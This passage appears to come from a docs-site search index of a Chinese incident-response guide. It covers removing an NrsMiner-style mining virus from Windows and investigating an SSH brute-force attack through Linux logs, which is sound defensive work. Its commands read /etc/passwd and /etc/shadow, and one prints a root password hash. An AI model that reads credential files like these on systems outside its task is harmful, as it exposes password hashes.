\u5220\u9664\u670d\u52a1\u9879\uff1aSc delete RemoteUPnPService 2\u3001 \u5220\u9664C:\\Windows\\NerworkDistribution\u76ee\u5f55 3\u3001 \u91cd\u542f\u8ba1\u7b97\u673a 4\u3001 \u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u5168\u76d8\u67e5\u6740 5\u3001 \u5230\u5fae\u8f6f\u5b98\u65b9\u7f51\u7ad9\u4e0b\u8f7d\u5bf9\u5e94\u64cd\u4f5c\u7cfb\u7edf\u8865\u4e01\uff0c\u4e0b\u8f7d\u94fe\u63a5\uff1a https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010 0x03 \u540e\u8bb0 \u00b6 \u5728\u67e5\u8be2\u4e86\u5927\u91cf\u8d44\u6599\u540e\uff0c\u627e\u5230\u4e86\u4e00\u7bc7\u57282018\u5e742\u6708\u6709\u5173\u8be5\u75c5\u6bd2\u7684\u62a5\u544a\uff1a NrsMiner\uff1a\u4e00\u4e2a\u6784\u9020\u7cbe\u5bc6\u7684\u6316\u77ff\u50f5\u5c38\u7f51\u7edc https://www.freebuf.com/articles/system/162874.html \u6839\u636e\u6587\u7ae0\u63d0\u793a\uff0c\u8fd9\u4e2a\u75c5\u6bd2\u7684\u6784\u9020\u975e\u5e38\u7684\u590d\u6742\uff0c\u4e3b\u63a7\u6a21\u5757\u4f5c\u4e3a\u670d\u52a1\u201cHyper-VAccess Protection Agent Service\u201d\u7684ServiceDll\u5b58\u5728\u3002\u4f46\u4e0e\u76ee\u524d\u5904\u7406\u7684\u60c5\u51b5\u6709\u6240\u4e0d\u540c\uff0c\u8be5\u75c5\u6bd2\u7591\u4f3c\u662f\u5347\u7ea7\u4e86\u3002","title":"\u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#\u7b2c6\u7bc7\u6316\u77ff\u75c5\u6bd2\u4e8c","text":"","title":"\u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#0x00-\u524d\u8a00","text":"\u4f5c\u4e3a\u4e00\u4e2a\u8fd0\u7ef4\u5de5\u7a0b\u5e08\uff0c\u800c\u975e\u4e00\u4e2a\u4e13\u4e1a\u7684\u75c5\u6bd2\u5206\u6790\u5de5\u7a0b\u5e08\uff0c\u9047\u5230\u4e86\u6bd4\u8f83\u590d\u6742\u7684\u75c5\u6bd2\u600e\u4e48\u529e\uff1f\u522b\u6015\uff0c\u867d\u7136\u5bf9\u4e8c\u8fdb\u5236\u4e0d\u719f\uff0c\u4f46\u662f\u4f9d\u9760\u7cfb\u7edf\u8fd0\u7ef4\u7684\u7ecf\u9a8c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u81ea\u5df1\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u5b83\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#0x01-\u611f\u67d3\u73b0\u8c61","text":"1\u3001\u5411\u5927\u91cf\u8fdc\u7a0bIP\u7684445\u7aef\u53e3\u53d1\u9001\u8bf7\u6c42 2\u3001\u4f7f\u7528\u5404\u79cd\u6740\u6bd2\u8f6f\u4ef6\u67e5\u6740\u65e0\u679c\uff0c\u867d\u7136\u80fd\u8bc6\u522b\u51fa\u5728C:\\Windows\\NerworkDistribution\u4e2d\u53d1\u73b0\u5f02\u5e38\u6587\u4ef6\uff0c\u4f46\u5373\u4f7f\u5220\u9664NerworkDistribution\u540e\uff0c\u6bcf\u6b21\u91cd\u542f\u53c8\u4f1a\u518d\u6b21\u751f\u6210\u3002 \u8fde\u6740\u8f6f\u6e05\u9664\u4e0d\u4e86\u7684\u75c5\u6bd2\uff0c\u53ea\u80fd\u624b\u5de5\u6765\u5427\uff0c\u4e2a\u4eba\u6bd4\u8f83\u504f\u597d\u706b\u7ed2\uff0c\u754c\u9762\u6bd4\u8f83\u7b80\u6d01\uff0c\u529f\u80fd\u4e5f\u633a\u597d\u7528\u7684\uff0c\u81ea\u5e26\u7684\u706b\u7ed2\u5251\u662f\u5b89\u5168\u5206\u6790\u5229\u5668\u3002\u4e8e\u662f\u5b89\u88c5\u4e86\u706b\u7ed2\uff0c\u6709\u4e86\u5982\u4e0b\u5206\u6790\u6392\u67e5\u8fc7\u7a0b\u3002","title":"0x01 \u611f\u67d3\u73b0\u8c61"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#0x02-\u4e8b\u4ef6\u5206\u6790","text":"","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#a\u7f51\u7edc\u94fe\u63a5","text":"\u901a\u8fc7\u73b0\u8c61\uff0c\u627e\u5230\u5bf9\u5916\u53d1\u9001\u8bf7\u6c42\u7684\u8fdb\u7a0bID\uff1a4960","title":"A\u3001\u7f51\u7edc\u94fe\u63a5"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#b\u8fdb\u7a0b\u5206\u6790","text":"\u8fdb\u4e00\u6b65\u901a\u8fc7\u8fdb\u7a0bID\u627e\u5230\u76f8\u5173\u8054\u7684\u8fdb\u7a0b\uff0c\u7236\u8fdb\u7a0b\u4e3a1464 \u627e\u5230\u8fdb\u7a0bID\u4e3a1464\u7684\u670d\u52a1\u9879\uff0c\u9010\u4e00\u6392\u67e5\uff0c\u6211\u4eec\u53d1\u73b0\u670d\u52a1\u9879RemoteUPnPService\u5b58\u5728\u5f02\u5e38\u3002","title":"B\u3001\u8fdb\u7a0b\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#c\u5220\u9664\u670d\u52a1","text":"\u9009\u62e9\u53ef\u7591\u670d\u52a1\u9879\uff0c\u53f3\u952e\u5c5e\u6027\uff0c\u505c\u6b62\u670d\u52a1\uff0c\u542f\u52a8\u7c7b\u578b\uff1a\u7981\u6b62\u3002 \u505c\u6b62\u5e76\u7981\u7528\u670d\u52a1\uff0c\u518d\u6e05\u9664NerworkDistribution\u76ee\u5f55\u540e\uff0c\u91cd\u542f\u8ba1\u7b97\u673a\u3002\u5f02\u5e38\u8bf7\u6c42\u548c\u76ee\u5f55\u7684\u73b0\u8c61\u6d88\u5931\u3002 \u53c8\u6392\u67e5\u4e86\u51e0\u53f0\uff0c\u73b0\u8c61\u4e00\u81f4\uff0c\u5c31\u662f\u670d\u52a1\u9879\u7684\u540d\u79f0\u6709\u70b9\u53d8\u5316\u3002","title":"C\u3001\u5220\u9664\u670d\u52a1"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#d\u75c5\u6bd2\u6e05\u9664","text":"\u6316\u77ff\u75c5\u6bd2\u6e05\u9664\u8fc7\u7a0b\u5982\u4e0b\uff1a 1\u3001 \u505c\u6b62\u5e76\u7981\u7528\u53ef\u7591\u7684\u670d\u52a1\u9879\uff0c\u670d\u52a1\u9879\u7684\u540d\u79f0\u4f1a\u53d8\uff0c\u4f46\u63cf\u8ff0\u662f\u4e0d\u53d8\u7684\uff0c\u6839\u636e\u63cf\u8ff0\u53ef\u5feb\u901f\u627e\u5230\u53ef\u7591\u670d\u52a1\u9879\u3002 \u200b \u53ef\u7591\u670d\u52a1\u9879\u63cf\u8ff0\uff1aEnables a common interface and object model for the Remote UPnP Service to access \u200b \u5220\u9664\u670d\u52a1\u9879\uff1aSc delete RemoteUPnPService 2\u3001 \u5220\u9664C:\\Windows\\NerworkDistribution\u76ee\u5f55 3\u3001 \u91cd\u542f\u8ba1\u7b97\u673a 4\u3001 \u4f7f\u7528\u6740\u6bd2\u8f6f\u4ef6\u5168\u76d8\u67e5\u6740 5\u3001 \u5230\u5fae\u8f6f\u5b98\u65b9\u7f51\u7ad9\u4e0b\u8f7d\u5bf9\u5e94\u64cd\u4f5c\u7cfb\u7edf\u8865\u4e01\uff0c\u4e0b\u8f7d\u94fe\u63a5\uff1a https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010","title":"D\u3001\u75c5\u6bd2\u6e05\u9664"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC04%E7%AB%A0%EF%BC%9AWindows%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC6%E7%AF%87%EF%BC%9A%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%EF%BC%88%E4%BA%8C%EF%BC%89/#0x03-\u540e\u8bb0","text":"\u5728\u67e5\u8be2\u4e86\u5927\u91cf\u8d44\u6599\u540e\uff0c\u627e\u5230\u4e86\u4e00\u7bc7\u57282018\u5e742\u6708\u6709\u5173\u8be5\u75c5\u6bd2\u7684\u62a5\u544a\uff1a NrsMiner\uff1a\u4e00\u4e2a\u6784\u9020\u7cbe\u5bc6\u7684\u6316\u77ff\u50f5\u5c38\u7f51\u7edc https://www.freebuf.com/articles/system/162874.html \u6839\u636e\u6587\u7ae0\u63d0\u793a\uff0c\u8fd9\u4e2a\u75c5\u6bd2\u7684\u6784\u9020\u975e\u5e38\u7684\u590d\u6742\uff0c\u4e3b\u63a7\u6a21\u5757\u4f5c\u4e3a\u670d\u52a1\u201cHyper-VAccess Protection Agent Service\u201d\u7684ServiceDll\u5b58\u5728\u3002\u4f46\u4e0e\u76ee\u524d\u5904\u7406\u7684\u60c5\u51b5\u6709\u6240\u4e0d\u540c\uff0c\u8be5\u75c5\u6bd2\u7591\u4f3c\u662f\u5347\u7ea7\u4e86\u3002","title":"0x03 \u540e\u8bb0"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/","text":"\u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u00b6 0x00 \u524d\u8a00 \u00b6 \u200b SSH \u662f\u76ee\u524d\u8f83\u53ef\u9760\uff0c\u4e13\u4e3a\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u548c\u5176\u4ed6\u7f51\u7edc\u670d\u52a1\u63d0\u4f9b\u5b89\u5168\u6027\u7684\u534f\u8bae\uff0c\u4e3b\u8981\u7528\u4e8e\u7ed9\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u4fdd\u8bc1\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\u3002SSH\u53e3\u4ee4\u957f\u5ea6\u592a\u77ed\u6216\u8005\u590d\u6742\u5ea6\u4e0d\u591f\uff0c\u5982\u4ec5\u5305\u542b\u6570\u5b57\uff0c\u6216\u4ec5\u5305\u542b\u5b57\u6bcd\u7b49\uff0c\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u7834\u89e3\uff0c\u4e00\u65e6\u88ab\u653b\u51fb\u8005\u83b7\u53d6\uff0c\u53ef\u7528\u6765\u76f4\u63a5\u767b\u5f55\u7cfb\u7edf\uff0c\u63a7\u5236\u670d\u52a1\u5668\u6240\u6709\u6743\u9650\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u200b \u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u767b\u5f55\u670d\u52a1\u5668\u8fdb\u884c\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u7aef\u53e3\u8fde\u63a5\u91cc\u5b58\u5728\u4e24\u6761\u53ef\u7591\u7684\u8fde\u63a5\u8bb0\u5f55\uff0c\u5982\u4e0b\u56fe\uff1a TCP\u521d\u59cb\u5316\u8fde\u63a5\u4e09\u6b21\u63e1\u624b\u5427\uff1a\u53d1SYN\u5305\uff0c\u7136\u540e\u8fd4\u56deSYN/ACK\u5305\uff0c\u518d\u53d1ACK\u5305\uff0c\u8fde\u63a5\u6b63\u5f0f\u5efa\u7acb\u3002\u4f46\u662f\u8fd9\u91cc\u6709\u70b9\u51fa\u5165\uff0c\u5f53\u8bf7\u6c42\u8005\u6536\u5230SYS/ACK\u5305\u540e\uff0c\u5c31\u5f00\u59cb\u5efa\u7acb\u8fde\u63a5\u4e86\uff0c\u800c\u88ab\u8bf7\u6c42\u8005\u7b2c\u4e09\u6b21\u63e1\u624b\u7ed3\u675f\u540e\u624d\u5efa\u7acb\u8fde\u63a5\u3002 \u5ba2\u6237\u7aefTCP\u72b6\u6001\u8fc1\u79fb\uff1a \u200b CLOSED->SYN_SENT->ESTABLISHED->FIN_WAIT_1->FIN_WAIT_2->TIME_WAIT->CLOSED \u670d\u52a1\u5668TCP\u72b6\u6001\u8fc1\u79fb\uff1a \u200b CLOSED->LISTEN->SYN recv->ESTABLISHED->CLOSE_WAIT->LAST_ACK->CLOSED \u5f53\u5ba2\u6237\u7aef\u5f00\u59cb\u8fde\u63a5\u65f6\uff0c\u670d\u52a1\u5668\u8fd8\u5904\u4e8eLISTENING\uff0c\u5ba2\u6237\u7aef\u53d1\u4e00\u4e2aSYN\u5305\u540e\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u5230\u4e86\u5ba2\u6237\u7aef\u7684SYN\u5e76\u4e14\u53d1\u9001\u4e86ACK\u65f6\uff0c\u670d\u52a1\u5668\u5904\u4e8eSYN_RECV\u72b6\u6001\uff0c\u7136\u540e\u5e76\u6ca1\u6709\u518d\u6b21\u6536\u5230\u5ba2\u6237\u7aef\u7684ACK\u8fdb\u5165ESTABLISHED\u72b6\u6001\uff0c\u4e00\u76f4\u505c\u7559\u5728SYN_RECV\u72b6\u6001\u3002 \u5728\u8fd9\u91cc\uff0cSSH\uff0822\uff09\u7aef\u53e3\uff0c\u4e24\u6761\u5916\u7f51IP\u7684SYN_RECV\u72b6\u6001\u8fde\u63a5\uff0c\u76f4\u89c9\u544a\u8bc9\u4e86\u7ba1\u7406\u5458\uff0c\u8fd9\u91cc\u4e00\u5b9a\u6709\u4ec0\u4e48\u5f02\u5e38\u3002 0x02 \u65e5\u5fd7\u5206\u6790 \u00b6 \u200b SSH\u7aef\u53e3\u5f02\u5e38\uff0c\u6211\u4eec\u9996\u5148\u6709\u5fc5\u8981\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5\uff1a A\u3001\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5 1\u3001\u9664root\u4e4b\u5916\uff0c\u662f\u5426\u8fd8\u6709\u5176\u5b83\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd root 2\u3001\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7::: \u6211\u4eec\u53ef\u4ee5\u786e\u8ba4\u76ee\u524d\u7cfb\u7edf\u53ea\u6709\u4e00\u4e2a\u7ba1\u7406\u7528\u6237root\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u60f3\u5230\u7684\u662f/var/log/secure\uff0c\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u8bb0\u5f55\u4e86\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\u4e0b\u6765\u3002 B\u3001\u786e\u8ba4\u653b\u51fb\u60c5\u51b5\uff1a 1\u3001\u7edf\u8ba1\u4e86\u4e0b\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u7ea6\u6709126254\u6b21\u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u906d\u53d7\u66b4\u529b\u7834\u89e3 [root@localhost ~]# grep -o \"Failed password\" /var/log/secure|uniq -c 126254 Failed password 2\u3001\u8f93\u51fa\u767b\u5f55\u7206\u7834\u7684\u7b2c\u4e00\u884c\u548c\u6700\u540e\u4e00\u884c\uff0c\u786e\u8ba4\u7206\u7834\u65f6\u95f4\u8303\u56f4\uff1a [root@localhost ~]# grep \"Failed password\" /var/log/secure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 [root@localhost ~]# grep \"Failed password\" /var/log/secure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3\u3001\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr 12622 23.91.xxx.xxx 8942 114.104.xxx.xxx 8122 111.13.xxx.xxx 7525 123.59.xxx.xxx ................... 4\u3001\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user ..................... C\u3001\u7ba1\u7406\u5458\u6700\u8fd1\u767b\u5f55\u60c5\u51b5\uff1a 1\u3001\u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 ............................ \u901a\u8fc7\u767b\u5f55\u65e5\u5fd7\u5206\u6790\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u767b\u5f55IP\u3002 2\u3001\u987a\u4fbf\u7edf\u8ba1\u4e00\u4e0b\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 27 192.168.204.1 \u901a\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u4ece\u8fd1\u6bb5\u65f6\u95f4\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u767b\u5f55\u8bb0\u5f55\u6765\u770b\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u7684\u60c5\u51b5\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u5165\u4fb5\u6392\u67e5\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u9610\u8ff0\u3002 0x04 \u5904\u7406\u63aa\u65bd \u00b6 \u200b SSH\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u5411\u516c\u7f51\u5f00\u653e\u7ba1\u7406\u7aef\u53e3\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668ssh\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002","title":"\u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#\u7b2c1\u7bc7ssh\u66b4\u529b\u7834\u89e3","text":"","title":"\u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#0x00-\u524d\u8a00","text":"\u200b SSH \u662f\u76ee\u524d\u8f83\u53ef\u9760\uff0c\u4e13\u4e3a\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u548c\u5176\u4ed6\u7f51\u7edc\u670d\u52a1\u63d0\u4f9b\u5b89\u5168\u6027\u7684\u534f\u8bae\uff0c\u4e3b\u8981\u7528\u4e8e\u7ed9\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u4fdd\u8bc1\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\u3002SSH\u53e3\u4ee4\u957f\u5ea6\u592a\u77ed\u6216\u8005\u590d\u6742\u5ea6\u4e0d\u591f\uff0c\u5982\u4ec5\u5305\u542b\u6570\u5b57\uff0c\u6216\u4ec5\u5305\u542b\u5b57\u6bcd\u7b49\uff0c\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u7834\u89e3\uff0c\u4e00\u65e6\u88ab\u653b\u51fb\u8005\u83b7\u53d6\uff0c\u53ef\u7528\u6765\u76f4\u63a5\u767b\u5f55\u7cfb\u7edf\uff0c\u63a7\u5236\u670d\u52a1\u5668\u6240\u6709\u6743\u9650\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#0x01-\u5e94\u6025\u573a\u666f","text":"\u200b \u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u767b\u5f55\u670d\u52a1\u5668\u8fdb\u884c\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u7aef\u53e3\u8fde\u63a5\u91cc\u5b58\u5728\u4e24\u6761\u53ef\u7591\u7684\u8fde\u63a5\u8bb0\u5f55\uff0c\u5982\u4e0b\u56fe\uff1a TCP\u521d\u59cb\u5316\u8fde\u63a5\u4e09\u6b21\u63e1\u624b\u5427\uff1a\u53d1SYN\u5305\uff0c\u7136\u540e\u8fd4\u56deSYN/ACK\u5305\uff0c\u518d\u53d1ACK\u5305\uff0c\u8fde\u63a5\u6b63\u5f0f\u5efa\u7acb\u3002\u4f46\u662f\u8fd9\u91cc\u6709\u70b9\u51fa\u5165\uff0c\u5f53\u8bf7\u6c42\u8005\u6536\u5230SYS/ACK\u5305\u540e\uff0c\u5c31\u5f00\u59cb\u5efa\u7acb\u8fde\u63a5\u4e86\uff0c\u800c\u88ab\u8bf7\u6c42\u8005\u7b2c\u4e09\u6b21\u63e1\u624b\u7ed3\u675f\u540e\u624d\u5efa\u7acb\u8fde\u63a5\u3002 \u5ba2\u6237\u7aefTCP\u72b6\u6001\u8fc1\u79fb\uff1a \u200b CLOSED->SYN_SENT->ESTABLISHED->FIN_WAIT_1->FIN_WAIT_2->TIME_WAIT->CLOSED \u670d\u52a1\u5668TCP\u72b6\u6001\u8fc1\u79fb\uff1a \u200b CLOSED->LISTEN->SYN recv->ESTABLISHED->CLOSE_WAIT->LAST_ACK->CLOSED \u5f53\u5ba2\u6237\u7aef\u5f00\u59cb\u8fde\u63a5\u65f6\uff0c\u670d\u52a1\u5668\u8fd8\u5904\u4e8eLISTENING\uff0c\u5ba2\u6237\u7aef\u53d1\u4e00\u4e2aSYN\u5305\u540e\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u5230\u4e86\u5ba2\u6237\u7aef\u7684SYN\u5e76\u4e14\u53d1\u9001\u4e86ACK\u65f6\uff0c\u670d\u52a1\u5668\u5904\u4e8eSYN_RECV\u72b6\u6001\uff0c\u7136\u540e\u5e76\u6ca1\u6709\u518d\u6b21\u6536\u5230\u5ba2\u6237\u7aef\u7684ACK\u8fdb\u5165ESTABLISHED\u72b6\u6001\uff0c\u4e00\u76f4\u505c\u7559\u5728SYN_RECV\u72b6\u6001\u3002 \u5728\u8fd9\u91cc\uff0cSSH\uff0822\uff09\u7aef\u53e3\uff0c\u4e24\u6761\u5916\u7f51IP\u7684SYN_RECV\u72b6\u6001\u8fde\u63a5\uff0c\u76f4\u89c9\u544a\u8bc9\u4e86\u7ba1\u7406\u5458\uff0c\u8fd9\u91cc\u4e00\u5b9a\u6709\u4ec0\u4e48\u5f02\u5e38\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC05%E7%AB%A0%EF%BC%9ALinux%E5%AE%9E%E6%88%98%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9ASSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/#0x02-\u65e5\u5fd7\u5206\u6790","text":"\u200b SSH\u7aef\u53e3\u5f02\u5e38\uff0c\u6211\u4eec\u9996\u5148\u6709\u5fc5\u8981\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5\uff1a A\u3001\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5 1\u3001\u9664root\u4e4b\u5916\uff0c\u662f\u5426\u8fd8\u6709\u5176\u5b83\u7279\u6743\u7528\u6237(uid \u4e3a0) 